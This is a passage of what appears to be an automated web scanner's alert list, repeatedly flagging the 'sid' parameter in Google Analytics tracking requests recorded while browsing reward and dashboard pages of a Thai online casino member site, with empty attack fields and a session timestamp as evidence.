C%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=13303
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754280656930&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=2396&tfd=773789
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754280656930&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=18055&tfd=396227
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281433395&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=18990
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281433395&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=4354&tfd=34240
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281433395&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=13691&tfd=34238
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281460908&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=3350
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281460908&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=2836&tfd=6198
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281460908&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=2418&tfd=6196
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281466515&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Freward%2Fcategory%2F2&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=6351
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281466515&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Freward%2Fcategory%2F2&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=106509&tfd=1063949
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754281466515&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Freward%2Fcategory%2F2&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=26620&tfd=32987
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
